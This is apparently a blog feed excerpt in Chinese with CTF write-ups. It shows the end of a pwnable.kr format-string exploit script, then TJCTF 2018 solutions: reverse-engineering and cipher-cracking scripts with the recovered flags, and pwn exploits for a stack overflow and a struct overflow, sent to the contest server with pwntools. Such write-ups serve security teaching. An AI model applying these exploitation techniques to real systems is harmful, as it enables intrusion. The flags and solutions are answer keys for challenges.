&quot;%&#123;&#125;c%&#123;&#125;$hn&quot;.format(flag_addr&amp;0xffff,offset)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    esp = leak_esp()</span><br><span class="line">    print hex(esp)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    ebp_main = leak_ebp_main()</span><br><span class="line">    print hex(ebp_main)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    ebp_main_to_got()</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    offset = (ebp_main-esp)/4</span><br><span class="line">    sleep_to_flag(offset)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h4 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h4><ul><li><a href="https://blog.csdn.net/SmalOSnail/article/details/53705774" target="_blank" rel="noopener">https://blog.csdn.net/SmalOSnail/article/details/53705774</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;题面&quot;&gt;&lt;a href=&quot;#题面&quot; class=&quot;headerlink&quot; title=&quot;题面&quot;&gt;&lt;/a&gt;题面&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;Isn’t FSB almost obsolete in computer security?&lt;br&gt;Anyway, have fun with it :)&lt;/p&gt;
&lt;p&gt;ssh &lt;a href=&quot;mailto:fsb@pwnable.kr&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;fsb@pwnable.kr&lt;/a&gt; -p2222 (pw:guest)&lt;/p&gt;
&lt;p&gt;On Aug 15,2018&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Format-String-Bug" scheme="https://l1b0.fun/tags/Format-String-Bug/"/>
    
  </entry>
  
  <entry>
    <title>TJCTF-2018-bin-Writeup</title>
    <link href="https://l1b0.fun/2018/08/13/TJCTF-2018-bin-Writeup/"/>
    <id>https://l1b0.fun/2018/08/13/TJCTF-2018-bin-Writeup/</id>
    <published>2018-08-13T12:23:43.000Z</published>
    <updated>2019-09-17T12:24:49.906Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Unsolved: pwn-Online-Banking</p></blockquote><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Validator-points-30"><a href="#Validator-points-30" class="headerlink" title="Validator(points: 30)"></a>Validator(points: 30)</h3><p>首先file看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">▶ file flagcheck </span><br><span class="line">flagcheck: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=89bdc886ab26b531450aa6ecb741b66a060b7605, not stripped</span><br></pre></td></tr></table></figure><p>用ida看伪代码会发现是明文比较，如下图。</p><a id="more"></a><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fu5hhjumbhj30eb0eygml.jpg" alt="img"></p><p>但是把其中的一些字符给赋了其他的值，直接看看不出什么(其实也可以直接手动替换2333，根据s1,v5,v6,v7的相对偏移就可以进行替换)，于是尝试ida调试&amp;gdb调试。</p><h4 id="The-fisrt-way-IDA调试"><a href="#The-fisrt-way-IDA调试" class="headerlink" title="The fisrt way: IDA调试"></a>The fisrt way: IDA调试</h4><blockquote><p>关于如何在IDA中调试elf详见：<a href="https://blog.csdn.net/abc_670/article/details/80066817" target="_blank" rel="noopener">https://blog.csdn.net/abc_670/article/details/80066817</a></p></blockquote><p>首先在Debugger-&gt;Process options里设置argv参数，长度为43</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1fu5jtfbvlyj30gj094dg6.jpg" alt="img"></p><p>在<code>if ( strlen(argv[1]) == 43 )</code>处下断点，开始调试</p><p>当替换完成后，由于s1处于ebp-0x38的位置，于是在ebp-0x38处<code>add watch</code>，其实下断点也不是最直接的方式，这里就提一下。</p><blockquote><p>下断点: Debugger-&gt;Watchs-&gt;add watch</p></blockquote><p>可以看到<code>ebp = 0xffb1c158</code>，那么s1在栈上地址为<code>ebp-0x38 = 0xffb1c120</code></p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5k4xe3xxj30cd07w74i.jpg" alt="img"></p><p>在<code>stack view</code>的表里我们可以直接的看到ebp-0x38处的值，如下图</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu5k6cb7fwj30cg07djrs.jpg" alt="img"></p><p>但是这样还不够直观，我们可以在<code>FFB1C120</code>处右键-&gt;Follow in hex dump</p><p>然后点View-&gt;Open subviews-&gt;Hex dump，即可看到<code>FFB1C120</code>对应的值的字符形式</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fu5k9ybi23j30f7077t9b.jpg" alt="img"></p><p>至此，flag到手:-)</p><h4 id="The-second-way-GDB调试"><a href="#The-second-way-GDB调试" class="headerlink" title="The second way: GDB调试"></a>The second way: GDB调试</h4><p>关键命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb flagcheck</span><br><span class="line">start aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">b *0x080485AB</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10 $ebp-0x38</span><br><span class="line">0xffffd3f0:&quot;tjctf&#123;ju57_c4ll&quot;...</span><br><span class="line">0xffffd3ff:&quot;_m3_35r3v3r_60d&quot;...</span><br><span class="line">0xffffd40e:&quot;_fr0m_n0w_0n&#125;&quot;</span><br><span class="line">0xffffd41c:&quot;&quot;</span><br><span class="line">0xffffd41d:&quot;\256\300\217\334\323\372\367@\324\377\377&quot;</span><br><span class="line">0xffffd429:&quot;&quot;</span><br><span class="line">0xffffd42a:&quot;&quot;</span><br><span class="line">0xffffd42b:&quot;&quot;</span><br><span class="line">0xffffd42c:&quot;v\&quot;\341\367\002&quot;</span><br><span class="line">0xffffd432:&quot;&quot;</span><br></pre></td></tr></table></figure><p>即可拿到flag:-)</p><blockquote><p>相对IDA的dynamic debugging，我用gdb更为顺手:-(</p><p>但ida的可视化确实很方便，并且还有很多功能待学习</p></blockquote><h3 id="Python-Reversing-points-40"><a href="#Python-Reversing-points-40" class="headerlink" title="Python-Reversing(points: 40)"></a>Python-Reversing(points: 40)</h3><p>先放源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">flag = &apos;redacted&apos;</span><br><span class="line"></span><br><span class="line">np.random.seed(12345)</span><br><span class="line">arr = np.array([ord(c) for c in flag])</span><br><span class="line">other = np.random.randint(1,5,(len(flag)))</span><br><span class="line">arr = np.multiply(arr,other)</span><br><span class="line"></span><br><span class="line">b = [x for x in arr]</span><br><span class="line">lmao = [ord(x) for x in &apos;&apos;.join([&apos;ligma_sugma_sugondese_&apos;*5])]</span><br><span class="line">c = [b[i]^lmao[i] for i,j in enumerate(b)]</span><br><span class="line">print(&apos;&apos;.join(bin(x)[2:].zfill(8) for x in c))</span><br><span class="line"></span><br><span class="line"># original_output was 1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101</span><br></pre></td></tr></table></figure><p>大致的加密过程如下</p><blockquote><p>b = flag * other</p><p>c = b ^ lmao</p></blockquote><p>这里的other是一个由不大于4的数组成的随机数组，但随机数的种子给了，相当于other已知，而lmao也是已知的，直接逆就可以。</p><p>但是有一个问题，original_output这串二进制串长度为202，并不能被8整除，我当时就很疑惑，以为我下载的文件是错的。。。</p><p>后来想明白了，由于第一步加密中flag直接与other相乘，导致b数组的值可能大于255，超出8位二进制串能表示的最大值，于是在zfill的时候长度大于8，就像下面这样。</p><p>那么我们怎么判断是哪个位置的值大于255呢，这里可以通过当为8位二进制串时，和lmao异或之后模other是否为0，如果不为0，就再添加一位二进制数。</p><p>exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">flag = &apos;abcdefghijklmnopqrstuvwxy&apos;</span><br><span class="line"></span><br><span class="line">np.random.seed(12345)</span><br><span class="line">#arr = np.array([ord(c) for c in flag])</span><br><span class="line">#print arr </span><br><span class="line">other = np.random.randint(1,5,25)</span><br><span class="line">print &quot;[+]other: &#123;&#125;&quot;.format(other)</span><br><span class="line">#arr = np.multiply(arr,other)</span><br><span class="line">#print arr</span><br><span class="line">#b = [x for x in arr]</span><br><span class="line"></span><br><span class="line">lmao = [ord(x) for x in &apos;&apos;.join([&apos;ligma_sugma_sugondese_&apos;*5])]</span><br><span class="line"></span><br><span class="line">#c = [b[i]^lmao[i] for i,j in enumerate(b)]</span><br><span class="line"></span><br><span class="line">#print(&apos;&apos;.join(bin(x)[2:].zfill(8) for x in c))</span><br><span class="line"></span><br><span class="line">output = &apos;1001100001011110110100001100001010000011110101001100100011101111110100011111010101010000000110000011101101110000101111101010111011100101000011011010110010100001100010001010101001100001110110100110011101&apos;</span><br><span class="line">#output1 = [304, 189, 161, 133, 7, 169,291]</span><br><span class="line"></span><br><span class="line">s = &apos;&apos;</span><br><span class="line">output1 = []</span><br><span class="line">sum,num = 0,0</span><br><span class="line">v = 0</span><br><span class="line">flag = 0</span><br><span class="line"></span><br><span class="line">for i,j in enumerate(output):</span><br><span class="line"></span><br><span class="line">    if sum%8 == 0 and flag == 1:</span><br><span class="line">        </span><br><span class="line">        v  = eval(&apos;0b&apos;+s)</span><br><span class="line">        if (v^lmao[num])%other[num] != 0:</span><br><span class="line">            output1.append( eval(&apos;0b&apos;+s+j) )</span><br><span class="line">            s = &apos;&apos;</span><br><span class="line">            </span><br><span class="line">        else:</span><br><span class="line">            output1.append( v )</span><br><span class="line">            sum += 1</span><br><span class="line">            s = j</span><br><span class="line">        num += 1</span><br><span class="line">        flag = 0</span><br><span class="line">        </span><br><span class="line">    else:</span><br><span class="line">        s+= j</span><br><span class="line">        sum += 1</span><br><span class="line">        flag = 1</span><br><span class="line"></span><br><span class="line">#print output1</span><br><span class="line"></span><br><span class="line">print &quot;[+]lmao: &#123;&#125;&quot;.format(lmao)</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">mod = [(lmao[i]^output1[i])%other[i] for i in range(len(output1))]</span><br><span class="line">print &quot;[+]mod==0? &#123;&#125;&quot;.format(mod)</span><br><span class="line">output2 = [ chr((lmao[i]^output1[i])/other[i]) for i in range(len(output1)) ]</span><br><span class="line"> </span><br><span class="line">print &quot;[+]flag: &#123;&#125;&quot;.format(&apos;&apos;.join(output2))</span><br><span class="line">#output3 = [ ofor i in range(25) ]</span><br></pre></td></tr></table></figure><h3 id="Bad-Cipher-points-50"><a href="#Bad-Cipher-points-50" class="headerlink" title="Bad-Cipher(points: 50)"></a>Bad-Cipher(points: 50)</h3><p>源码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">message = &quot;[REDACTED]&quot;</span><br><span class="line">key = &quot;&quot;</span><br><span class="line"></span><br><span class="line">r,o,u,x,h=range,ord,chr,&quot;&quot;.join,hex</span><br><span class="line">def e(m,k):</span><br><span class="line"> l=len(k);s=[m[i::l]for i in r(l)]</span><br><span class="line"> for i in r(l):</span><br><span class="line">  a,e=0,&quot;&quot;</span><br><span class="line">  for c in s[i]:</span><br><span class="line">   a=o(c)^o(k[i])^(a&gt;&gt;2)</span><br><span class="line">   e+=u(a)</span><br><span class="line">  s[i]=e</span><br><span class="line"> return x(h((1&lt;&lt;8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))</span><br><span class="line"></span><br><span class="line">print(e(message,key))</span><br></pre></td></tr></table></figure><p>这道题其实就是个分组加密，下面通过一个例子解释一下</p><blockquote><p>message = ‘123456789’</p><p>key = ‘abc’</p><p>s = [ ‘147’,’258’,’369’ ]</p><p>对于s[0]的第一个字符‘1’，a = o(‘1’)^o(‘a’)^(a&gt;&gt;2)，此时a的初始值为0，相当于s[0]的第一个加密结果== o(‘1’)^o(‘a’)，这很重要</p><p>之后进行相同操作</p><p>s_encode = [‘PAF’, ‘PCJ’, ‘PAJ’]</p><p>注意：返回的结果相当于’PPPACAFJJ’.encode(‘hex’)</p></blockquote><h4 id="Step1-爆破key的长度"><a href="#Step1-爆破key的长度" class="headerlink" title="Step1: 爆破key的长度"></a>Step1: 爆破key的长度</h4><p>首先我们确定len(message)应该要整除len(key)，那么key可能是<code>2 4 7 8 14 28</code></p><p>解题的关键在于flag格式为<code>tjctf{}</code>，相当于我们知道message的前6个字符，而分组加密中每组的第一个字符就是message的前几位，如果分组的长度正确，那么message[i]^cipher[i]的结果，即key，应该是可见字符，以此为标准爆破。</p><h4 id="Step2-爆破key的后两位"><a href="#Step2-爆破key的后两位" class="headerlink" title="Step2: 爆破key的后两位"></a>Step2: 爆破key的后两位</h4><p>这里假设已经知道了key的长度为8，而我们可以通过message的固定格式知道key的前6位，那么最后两位直接爆破即可。</p><h4 id="Exp如下"><a href="#Exp如下" class="headerlink" title="Exp如下"></a>Exp如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">message = &quot;[REDACTED]&quot;</span><br><span class="line">key = &quot;123456&quot;</span><br><span class="line">c = &apos;473c23192d4737025b3b2d34175f66421631250711461a7905342a3e365d08190215152f1f1e3d5c550c12521f55217e500a3714787b6554&apos;.decode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line">key_len = [2,4,7,8]#14,28</span><br><span class="line"></span><br><span class="line">r,o,u,x,h=range,ord,chr,&quot;&quot;.join,hex</span><br><span class="line"></span><br><span class="line">def e(m,k):</span><br><span class="line"> l=len(k);s=[m[i::l]for i in r(l)]</span><br><span class="line">#print s</span><br><span class="line"> for i in r(l):</span><br><span class="line">  a,e=0,&quot;&quot;</span><br><span class="line">  for c in s[i]:</span><br><span class="line">   a=o(c)^o(k[i])^(a&gt;&gt;2)</span><br><span class="line">   e+=u(a)</span><br><span class="line">  s[i]=e</span><br><span class="line">#print s</span><br><span class="line"> return x(h((1&lt;&lt;8)+o(f))[3:]for f in x(x(y)for y in zip(*s)))</span><br><span class="line"></span><br><span class="line">def d(c,key1,offset):</span><br><span class="line"></span><br><span class="line">    flag = &apos;&apos;</span><br><span class="line">                </span><br><span class="line">    a = [ 0 for l in range(len(key1)) ]</span><br><span class="line">    lenk = len(key1)</span><br><span class="line">                    </span><br><span class="line">    for k in range(len(c)):</span><br><span class="line">                        </span><br><span class="line">        if k%offset &lt; lenk:</span><br><span class="line">            flag += chr( key1[k%offset]^ord(c[k])^(a[k%offset]&gt;&gt;2) )</span><br><span class="line">            a[k%offset] = ord(flag[k])^key1[k%offset]^(a[k%offset]&gt;&gt;2)</span><br><span class="line">        else:</span><br><span class="line">            flag += &apos; &apos;</span><br><span class="line">    #burp_len</span><br><span class="line">    if len(key1) == 1 and flag.replace(&apos; &apos;,&apos;&apos;).isalnum():</span><br><span class="line">        print &quot;[*]You got the length. FLAG: &#123;&#125;&quot;.format(flag.replace(&apos; &apos;,&apos;&apos;))</span><br><span class="line">    #burp_flag</span><br><span class="line">    if flag.replace(&apos;_&apos;,&apos;&apos;).replace(&apos;&#123;&apos;,&apos;&apos;).replace(&apos;&#125;&apos;,&apos;&apos;).isalnum():</span><br><span class="line">        print &quot;key1 = &#123;&#125; key2 = &#123;&#125; flag = &#123;&#125;&quot;.format(key1[6],key1[7],flag)</span><br><span class="line">def burp_len():</span><br><span class="line">    </span><br><span class="line">    for i in [2,4,7,8,14,28]:</span><br><span class="line">        </span><br><span class="line">        #key[0] == ord(&apos;t&apos;)^0x47</span><br><span class="line">        key = [ord(&apos;t&apos;)^0x47]</span><br><span class="line">        print &quot;[+]The key length is &#123;&#125; QAQ&quot;.format(i)</span><br><span class="line">        d(c,key,i)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"></span><br><span class="line">    burp_len()</span><br><span class="line">    key_len = 8</span><br><span class="line">    flag = &apos;tjctf&#123;&apos;</span><br><span class="line">    for i in range(32,127):</span><br><span class="line">        for j in range(32,127):</span><br><span class="line">            </span><br><span class="line">            key = [ ord(flag[k])^ord(c[k]) for k in r(len(flag)) ]</span><br><span class="line">            key.append(i)</span><br><span class="line">            key.append(j)</span><br><span class="line">#print key</span><br><span class="line">            assert len(key) == key_len</span><br><span class="line">            d( c, key, key_len )</span><br><span class="line">    </span><br><span class="line">    key = [ chr(ord(flag[k])^ord(c[k])) for k in r(len(flag)) ]</span><br><span class="line">    flag = &apos;tjctf&#123;m4ybe_Wr1t3ing_mY_3ncRypT10N_MY5elf_W4Snt_v_sm4R7&#125;&apos;</span><br><span class="line">    key.append(chr(90))</span><br><span class="line">    key.append(chr(54))</span><br><span class="line">    </span><br><span class="line">    if e(flag,x(key)) == c.encode(&apos;hex&apos;):</span><br><span class="line">        print &quot;Right!!!&quot;</span><br><span class="line"></span><br><span class="line">#print(e(message,key))</span><br></pre></td></tr></table></figure><h3 id="Bricked-Binary-points-80"><a href="#Bricked-Binary-points-80" class="headerlink" title="Bricked-Binary(points: 80)"></a>Bricked-Binary(points: 80)</h3><blockquote><p>这题算是经典的elf逆向，难度不大，直接放出脚本，idc脚本也在里面</p></blockquote><h4 id="Exp如下-1"><a href="#Exp如下-1" class="headerlink" title="Exp如下"></a>Exp如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">u = [4,7,5,8,12,10,6,2,13,1,0,14,9,11,3,15]</span><br><span class="line"></span><br><span class="line">v = [129,205,10,115,179,59,50,182,110,124,49,87,209,197,21,58,146,180,226,81,174,66,85,65,225,112,48,26,2,132,162,231,185,77,60,163,11,178,43,171,70,126,36,156,133,111,228,196,95,206,79,1,130,253,108,172,223,100,12,161,227,158,93,187,254,211,41,150,199,243,252,101,170,138,90,245,183,56,165,141,216,142,57,7,222,213,17,128,229,137,53,255,221,166,31,35,13,192,147,200,103,23,104,24,139,98,204,157,218,86,102,198,127,230,134,224,34,194,15,27,246,45,99,51,145,113,89,235,169,210,131,191,61,106,8,249,167,64,0,232,82,190,250,78,38,118,207,84,125,25,6,248,208,116,40,5,63,160,30,193,69,73,212,175,3,155,47,238,39,154,164,151,72,74,217,55,71,173,68,202,239,215,184,219,240,159,88,83,234,42,122,54,135,140,181,114,136,177,9,241,22,62,105,20,236,37,188,237,186,189,44,201,220,19,244,117,29,75,195,52,16,107,119,152,94,92,153,143,18,148,203,46,76,233,32,247,67,96,251,109,28,120,14,176,214,80,121,123,97,149,168,4,91,242,144,33]</span><br><span class="line">#print len(u),len(v)</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">idc_export_v</span><br><span class="line">auto addr = 0x0804A040;</span><br><span class="line">auto addr1 = 0x0804A43C;</span><br><span class="line">auto i,x;</span><br><span class="line">Message(&quot;\n&quot;);</span><br><span class="line">for(i=0;addr&lt;=addr1;i++)</span><br><span class="line">&#123;</span><br><span class="line">    x = Byte(addr);</span><br><span class="line">    addr =addr + 4;</span><br><span class="line">    Message(&quot;%d,&quot;,x);</span><br><span class="line">&#125;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">output = &apos;22c15d5f23238a8fff8d299f8e5a1c62&apos;</span><br><span class="line">out_flag = map(ord,output.decode(&apos;hex&apos;))</span><br><span class="line">print out_flag</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(len(out_flag)):</span><br><span class="line">    for j in range(256):</span><br><span class="line">        if v[j]^u[len(out_flag)-i-1] == out_flag[i]:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            break</span><br><span class="line">print flag,len(flag)</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Math-Whiz-points-20"><a href="#Math-Whiz-points-20" class="headerlink" title="Math-Whiz(points: 20)"></a>Math-Whiz(points: 20)</h3><p>先看看开了什么保护，发现只有栈溢出可以利用:-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec register</span><br><span class="line">[*] &apos;/2018TJCTF/pwn-Math-Whiz20/register&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>用ida看下伪代码，关键在于v43是否为0</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fu5qxtbuwdj30eo0373yo.jpg" alt="img"></p><p>那么通过栈溢出覆盖v43即可</p><p>最初脚本如下，暴力的一批</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">io = remote(&apos;problem1.tjctf.org&apos;, 8001)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    io.sendlineafter(&apos;: &apos;,&apos;a&apos;*100)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>事实上看ida可以知道v43处于ebp-0xc的位置，只有在输入v30的时候允许最长长度为64的字符串，而v30处于ebp-0x44，v30和v43相距56，所以覆盖点在v30。</p><p>精致的输入如下</p><p><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fu5r6kglynj30so08ejtc.jpg" alt="img"></p><h3 id="Tilted-Troop-points-40"><a href="#Tilted-Troop-points-40" class="headerlink" title="Tilted-Troop(points: 40)"></a>Tilted-Troop(points: 40)</h3><p>首先看下开了什么保护，发现全开了:-(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">▶ checksec strover </span><br><span class="line">[*] &apos;/2018TJCTF/pwn-Tilted-Troop40/strover&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>给了源码，那就不费那劲看伪代码了，程序流程就是组个队打怪，如果最后队伍的队员力量值和等于400，拿到flag。</p><p>这里有个bug就是一个队伍里最大队员数只有8个，但是由于逻辑有bug导致我们能输入9个队员的信息。因为队员的名字和力量的地址是在内存中是连续的，如下图。所以第九个队员的name会把strength数组覆盖，那么我们就可以精确控制第九个队员的name覆盖strength数组使得队员的力量值和为400。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define MAX_TEAM_SIZE 8</span><br><span class="line"></span><br><span class="line">const int goal = 400;</span><br><span class="line"></span><br><span class="line">struct team &#123;</span><br><span class="line">    char* names[MAX_TEAM_SIZE];</span><br><span class="line">    char* strength;</span><br><span class="line">    int teamSize;</span><br><span class="line">&#125; typedef team;</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 